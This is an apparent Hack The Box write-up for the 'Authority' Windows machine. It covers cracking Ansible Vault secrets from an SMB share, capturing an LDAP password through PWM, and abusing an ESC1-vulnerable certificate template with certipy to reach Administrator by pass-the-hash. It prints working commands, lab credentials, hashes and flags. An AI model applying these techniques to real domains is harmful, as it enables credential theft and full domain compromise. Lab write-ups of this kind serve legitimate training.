---
title: Authority - HTB Writeup
date: 2024-07-22 10:03
categories: [ctf, windows, medium, ad]
tags: [htb, windows, ctf, medium, ad]    # TAG names should be lowercase
---


# Machine Info

Authority involves dumping ansible-vault secret text from SMB shares, cracking passwords using hashcat, and decrypting clear-text usernames and passwords, which give us access to PWM configuration windows. From the PWM configuration window, we will dump LDAP usernames and passwords, providing our initial foothold in the box. For privilege escalation, the svc_ldap user was a member of Active Directory Certificate Services, and the AD CS Template is vulnerable to ESC1. This means a low-privileged user can enroll and request certificates on behalf of any object (computer, user) specified by the user.

![Pasted image 20240722080228](https://github.com/user-attachments/assets/e34ec33f-0827-4f84-87d7-5e8d394b9640)


# User
## Scanning through Nmap

First, we'll use Nmap to scan the whole network and find out what services are running. With the **-p-** option, we can check all **65535** ports, and by adding **--min-rate 10000**, we can make the scan faster. After running Nmap, we'll have a list of open ports on the network, and we'll use tools like **cut** and **tr** to filter out only the open ones.

```shell
$ nmap -p- --min-rate 10000 10.10.11.236 -oN ini.txt && cat ini.txt | cut  -d ' ' -f1 | tr -d '/tcp' | tr '\n' ','
53,80,88,135,139,389,445,464,636,3268,3269,5985,47001,8443,49154,49664,49665,49666,49673,49690,49691,49694,49696,49702,49703,49719
```

Now let's run a detailed scan on these specific ports using...

```bash
$ nmap -p53,80,88,135,139,389,445,464,636,3268,3269,5985,47001,8443,49154,49664,49665,49666,49673,49690,49691,49694,49696,49702,49703,49719 -sC -sV -A -T4 10.10.11.236 -oN scan.txt
```

- **-sC** is to run all the default scripts
- **-sV** for service and version detection
- **-A** to check all default things
- **-T4** for aggressive scan
- **-oN** to write the result into a specified file

```bash
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
| http-methods: 
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-07-20 13:25:47Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
|_ssl-date: 2024-07-20T13:26:51+00:00; +3h59m59s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: othername: UPN::AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Not valid before: 2022-08-09T23:03:21
|_Not valid after:  2024-08-09T23:13:21
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: othername: UPN::AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Not valid before: 2022-08-09T23:03:21
|_Not valid after:  2024-08-09T23:13:21
|_ssl-date: 2024-07-20T13:26:52+00:00; +3h59m59s from scanner time.
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: othername: UPN::AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Not valid before: 2022-08-09T23:03:21
|_Not valid after:  2024-08-09T23:13:21
|_ssl-date: 2024-07-20T13:26:51+00:00; +3h59m59s from scanner time.
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
|_ssl-date: 2024-07-20T13:26:52+00:00; +3h59m59s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: othername: UPN::AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Not valid before: 2022-08-09T23:03:21
|_Not valid after:  2024-08-09T23:13:21
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
8443/tcp open  https-alt
|_http-title: Site does not have a title (text/html;charset=ISO-8859-1).
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=172.16.2.118
| Not valid before: 2024-07-19T14:42:08
|_Not valid after:  2026-07-22T02:20:32
49154/tcp open  msrpc         Microsoft Windows RPC
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  msrpc         Microsoft Windows RPC
49690/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49691/tcp open  msrpc         Microsoft Windows RPC
49694/tcp open  msrpc         Microsoft Windows RPC
49696/tcp open  msrpc         Microsoft Windows RPC
49702/tcp open  msrpc         Microsoft Windows RPC
49703/tcp open  msrpc         Microsoft Windows RPC
49719/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: AUTHORITY; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-07-20T13:26:44
|_  start_date: N/A
|_clock-skew: mean: 3h59m58s, deviation: 0s, median: 3h59m58s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

```

## Information Gathering

Through **Nmap** we found port **53 DNS** is open which can be used to perform zone transfer, **80 http** web port is open, **88 kerberose** is open which can be used to for enumeration and authentication purpose here, **139 & 445 SMB** ports are open and can be used to enumerate shares with anonymous user for initial access, **389 ldap** port is open, **5985 winrm** port is opened which can be used to login into machine if somehow we managed to obtain a valid credentials. Nmap discover Doamin name by using **ldap** scripts which is **htb.corp** and CNAME **authority.htb.corp** . Let's add this to our local DNS file called `/etc/hots` so that our computer can resolve domain

```shell
$ cat /etc/hosts | grep corp
10.129.35.171  htb.corp authority.htb
```

## 53 DNS

Let's start with the port **53** DNS and try to perform zone using **dig** (**dig** stands for **Domain Information Grabber**. It is used for retrieving information about DNS name servers. It is used for verifying and troubleshooting DNS problems and to perform DNS lookups). The complete command will be 

```bash
$ dig axfr @10.129.35.171 authority.htb.corp
```

Here **axfr** is a protocol(AXFR is **a protocol for “zone transfers” for replication of DNS data across multiple DNS servers**. Unlike normal DNS queries that require the user to know some DNS information ahead of time, **AXFR** queries reveal resource records including subdomain names). But we couldn't able to fetch any useful information.

```shell
$ dig axfr @10.129.35.171 authority.htb.corp

; <<>> DiG 9.19.25-185-g392e7199df2-1-Debian <<>> axfr @10.129.35.171 authority.htb.corp
; (1 server found)
;; global options: +cmd
; Transfer failed.
```

```shell 
$ dig axfr @10.129.35.171 htb.corp 

; <<>> DiG 9.19.19-1-Debian <<>> axfr @10.129.35.171 htb.corp
; (1 server found)
;; global options: +cmd
; Transfer failed.
```

We didn't fond anything using zone transfer. 

### RID brute force

Let's find users and groups in AD using **lookupsid.py** tool from impacket toolkit.
`lookupsid.py htb.corp/anonymous@10.129.35.171 -no-pass`. We found users and groups.
#### Users

| User ID | User Name         | SID                                           | Type        |
| ------- | ----------------- | --------------------------------------------- | ----------- |
| 500     | HTB\Administrator | S-1-5-21-622327497-3269355298-2248959698-500  | SidTypeUser |
| 501     | HTB\Guest         | S-1-5-21-622327497-3269355298-2248959698-501  | SidTypeUser |
| 502     | HTB\krbtgt        | S-1-5-21-622327497-3269355298-2248959698-502  | SidTypeUser |
| 1000    | HTB\AUTHORITY$    | S-1-5-21-622327497-3269355298-2248959698-1000 | SidTypeUser |
| 1601    | HTB\svc_ldap      | S-1-5-21-622327497-3269355298-2248959698-1601 | SidTypeUser |
|         | HTB\svc_pwm       |                                               |             |

#### Groups

| Group ID | Group Name                                  | SID                                          | Type         |
| -------- | ------------------------------------------- | -------------------------------------------- | ------------ |
| 498      | HTB\Enterprise Read-only Domain Controllers | S-1-5-21-622327497-3269355298-2248959698-498 | SidTypeGroup |
| 512      | HTB\Domain Admins                           | S-1-5-21-622327497-3269355298-2248959698-512 | SidTypeGroup |
| 513      | HTB\Domain Users                            | S-1-5-21-622327497-3269355298-2248959698-513 | SidTypeGroup |
| 514      | HTB\Domain Guests                           | S-1-5-21-622327497-3269355298-2248959698-514 | SidTypeGroup |
| 515      | HTB\Domain Computers                        | S-1-5-21-622327497-3269355298-2248959698-515 | SidTypeGroup |
| 516      | HTB\Domain Controllers                      | S-1-5-21-622327497-3269355298-2248959698-516 | SidTypeGroup |
| 517      | HTB\Cert Publishers                         | S-1-5-21-622327497-3269355298-224            | SidTypeGroup |

## SMB 139 & 445

We also have SMB ports open, let's try to list out smb shares if are available publicly using **smbclient**(The smbclient lets you **send messages to workstations, display browse lists and connect to SMB shares**). The command will be `smbclient -N -L \\\\10.129.35.171\\`
- **-N** is for no-pass
- **-L** for listing shares. 

The **Development** share is of our interest because we have read rights on it.

| Disk              | Permissions | Comment            |
| ----------------- | ----------- | ------------------ |
| ADMIN$            | NO ACCESS   | Remote Admin       |
| C$                | NO ACCESS   | Default share      |
| Department Shares | NO ACCESS   |                    |
| Development       | READ ONLY   |                    |
| IPC$              | READ ONLY   | Remote IPC         |
| NETLOGON          | NO ACCESS   | Logon server share |
| SYSVOL            | NO ACCESS   | Logon server share |

Ansible Directory is present in Development shares.

![Pasted image 20240722023827](https://github.com/user-attachments/assets/fb2e3ae2-286c-400e-98e7-de1c59c58186)

#### What is Ansible

Ansible is **an open source, command-line IT automation software application written in Python**. It can configure systems, deploy software, and orchestrate advanced workflows to support application deployment, system updates, and more.

In Ansible share directory, there is a file called main.yml in default directory `\Automation\Ansible\PWM\defaults\main.yml>`, which stores some encrypted data.

```
wm_run_dir: "{{ lookup('env', 'PWD') }}"

pwm_hostname: authority.htb.corp
pwm_http_port: "{{ http_port }}"
pwm_https_port: "{{ https_port }}"
pwm_https_enable: true

pwm_require_ssl: false

pwm_admin_login: !vault |
          $ANSIBLE_VAULT;1.1;AES256
          32666534386435366537653136663731633138616264323230383566333966346662313161326239
          6134353663663462373265633832356663356239383039640a346431373431666433343434366139
          35653634376333666234613466396534343030656165396464323564373334616262613439343033
          6334326263326364380a653034313733326639323433626130343834663538326439636232306531
          3438

pwm_admin_password: !vault |
          $ANSIBLE_VAULT;1.1;AES256
          31356338343963323063373435363261323563393235633365356134616261666433393263373736
          3335616263326464633832376261306131303337653964350a363663623132353136346631396662
          38656432323830393339336231373637303535613636646561653637386634613862316638353530
          3930356637306461350a316466663037303037653761323565343338653934646533663365363035
          6531

ldap_uri: ldap://127.0.0.1/
ldap_base_dn: "DC=authority,DC=htb"
ldap_admin_password: !vault |
          $ANSIBLE_VAULT;1.1;AES256
          63303831303534303266356462373731393561313363313038376166336536666232626461653630
          3437333035366235613437373733316635313530326639330a643034623530623439616136363563
          34646237336164356438383034623462323531316333623135383134656263663266653938333334
          3238343230333633350a646664396565633037333431626163306531336336326665316430613566
          3764
```

The data is encrypted by **ansible-vault**

#### What is ansible vault

**Ansible Vault** is a feature of Ansible that allows you to encrypt sensitive data within playbooks and inventory files.

The complete guide on cracking and decrypting the secret text from Ansible Vault is explain in the following link. [Cracking Ansible Vault Secrets with Hashcat (bengrewell.com)](https://www.bengrewell.com/cracking-ansible-vault-secrets-with-hashcat/) 

First we need to save the single vault blob into a separate file because we first need to convert this secret text to Hashcat breakable format using **ansible2john**

```bash
$ cat hash 

$ANSIBLE_VAULT;1.1;AES256
31356338343963323063373435363261323563393235633365356134616261666433393263373736
3335616263326464633832376261306131303337653964350a363663623132353136346631396662
38656432323830393339336231373637303535613636646561653637386634613862316638353530
3930356637306461350a316466663037303037653761323565343338653934646533663365363035
6531
```

convert it to hashcate breakable format 

```bash
$ ansible2john  hash1 > hash.a
$ cat hash.a 

$ansible$0*0*15c849c20c74562a25c925c3e5a4abafd392c77635abc2ddc827ba0a1037e9d5*1dff07007e7a25e438e94de3f3e605e1*66cb125164f19fb8ed22809393b1767055a66deae678f4a8b1f8550905f70da5
```

The mode for ansible hash in hashcat is **16900**, Let's crack it.

```bash
$ hashcat -m 16900 -O -a 0 hash.a /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt

$ansible$0*0*15c849c20c74562a25c925c3e5a4abafd392c77635abc2ddc827ba0a1037e9d5*1dff07007e7a25e438e94de3f3e605e1*66cb125164f19fb8ed22809393b1767055a66deae678f4a8b1f8550905f70da5:!@#$%^&*
```

- **-m** for mode
- **-O** for kernel mode
- **-a** for attack mode to bruteforce

Now we have the vault secret key to decrypt the secret text. Let's Decrypt it using **ansible-vault** . We will be using **view** switch to decrypt the text.

![Pasted image 20240721084706](https://github.com/user-attachments/assets/fd72d632-76aa-40a7-8e6d-680cb4c6a276)

We got both user name and the Password.
`svc_pwm : pWm_@dm!N_!23`

## HTTP 80 & 8443

On port 80, default IIS  server is running. But port 8443 looks interesting because it's running **PWM**

![Pasted image 20240722033813](https://github.com/user-attachments/assets/dd175ff1-9b81-4440-89ef-dc2c1d25d645)

#### What is PWM

PWM is **an open source password self service application for LDAP directories**. PWM is an ideal candidate for organizations that wish to roll their own password self service solution, but do not wish to start from scratch.

When i tried to login as **svc_pwm** user which we discovered before, it through an error that **all ldap profiles are unreachable**

![Pasted image 20240722034122](https://github.com/user-attachments/assets/8f08669f-e12f-4019-a54e-06696244740d)

But in **Configuration Editor** tab our password worked. And after walking through the whole application i discover **Test LDAP Profile** tab where it is testing if the connection is working. we found the username **svc_ldap** but the password is not visible, so i decided to set the LDAP URL to my netcat listener URL and grab the password.

![Pasted image 20240721184725](https://github.com/user-attachments/assets/3ae25ad1-2182-43e0-96c2-5813382f4656)

![Pasted image 20240721184634](https://github.com/user-attachments/assets/d52368e7-62de-43e5-bcf5-079405753938)

Now we have both user name and the password, Lets try to get shell as **svc_ldap** user on the network.
`svc_ldap : lDaP_1n_th3_cle4r!`

## Winrm 5985

Windows Remote Management (WinRM) is a protocol developed by Microsoft, enabling administrators to **manage and control Windows-based systems remotely**. Evil-winrm is a tool which use **WinRM** service to get remote shell on the box.

```bash
$ evil-winrm -i authority.htb -u svc_ldap -p 'lDaP_1n_th3_cle4r!'

*Evil-WinRM* PS C:\Users\svc_ldap\Documents> type ../Desktop/user.txt
2068cae1ded4b1dba056e924c59295e8
```


# Privilege Escalation

## Information Gathering

With a quick basic whoami command, i discover that the **svc_ldap** user is a member of **Certificate Serverice DCOM Access**.

![Pasted image 20240721185457](https://github.com/user-attachments/assets/d53caefe-7515-43a5-a0d4-6773b82feb01)

#### What is Active Directory Certificate Service

According to the Microsoft official documentation, **Active Directory Certificate Services (AD CS) is a Windows Server role for issuing and managing public key infrastructure (PKI) certificates used in secure communication and authentication protocols.** 

AD CS's complexity and configuration requirements present numerous opportunities for exploitation. Attackers can leverage a variety of vulnerabilities and misconfigurations to compromise domain security, escalate privileges, and maintain persistent access.

## Enumeration 

The Certificate Template is Vulnerable to ESC1 if the following requirements are met

- Client Authentication : True
- Enabled : True
- Enrollee Supplies Subject : True
- Require Management Approval : False
- Authorized Signature Required : 0

Command to find Vulnerable AD CS Certificate from linux is; 

```bash
$ certipy-ad find -u svc_ldap -p 'lDaP_1n_th3_cle4r!' -dc-ip 10.129.35.171 -stdout -enabled -vulnerable
```

In Below Screenshot, we can see that the all of the requirements are met for the certificate **CorpVPN** , which means the certificate is vulnerable to **ESC1**

![Pasted image 20240721193919](https://github.com/user-attachments/assets/e0c2159d-c922-4914-a9a4-03ba13894e27)

![Pasted image 20240721194128](https://github.com/user-attachments/assets/55e5ffe8-1fa1-4978-9fbf-026eb96dd2d9)

## Exploitation

First we need to add new Computer to the Domain because we have rights on Domain Computers and Domain Computer can request the Certificate.

```powershell
$ python3 addcomputer.py 'authority.htb/svc_ldap' -method LDAPS -computer-name 'EVIL1' -computer-pass 'MyStr0ngPass' -dc-ip 10.129.35.171
```

![Pasted image 20240721201659](https://github.com/user-attachments/assets/0ced1fb6-afbc-40eb-b43c-a3fcb926c857)

To abuse this, we need things mentioned below

- user name and password
- Certificate Authority Name
- Template Name
- User Principal Name (of which we can to request Certificate)

So the Command will be

```bash
$ certipy-ad req -u EVIL1$ -p 'MyStr0ngPass' -dc-ip 10.129.35.171 -ca AUTHORITY-CA -template CorpVPN -upn administrator@authority.htb -dns authority.htb -debug
```

- **req** for requesting mode
- **-ca** for Certificate Authority Name
- **-template** for template Name
- **-upn** for User Principal Name (Name in the format of Email)

![Pasted image 20240721201954](https://github.com/user-attachments/assets/5994c7cf-f68f-43bb-9ff6-0643c0075f6b)

Now we have certificate, Lets Sync our machine time with Target machine using. 

```bash
$ sudo ntpdate 10.129.35.171 
```

After syncing time, lets ask for TGT and NTLM hash of Admin user using automated method;

```bash
$ certipy-ad auth -pfx administrator_authority.pfx
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Found multiple identifications in certificate
[*] Please select one:
    [0] UPN: 'administrator@authority.htb'
    [1] DNS Host Name: 'authority.htb'
> 0
[*] Using principal: administrator@authority.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@authority.htb': aad3b435b51404eeaad3b435b51404ee:6961f422924da90a6928197429eea4ed
```

## Shell as Administrator

```powershell 
$ evil-winrm -i 10.129.35.171 -u administrator -H '6961f422924da90a6928197429eea4ed'

Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
htb\administrator
Evil-WinRM* PS C:\Users\Administrator\Documents> type ../Desktop/root.txt
a3edc451c38182d4d5e617081407e03d
```


# Flags

User : 2068cae1ded4b.....056e924c59295e8

Root : a3edc451c381.......4d5e617081407e03d
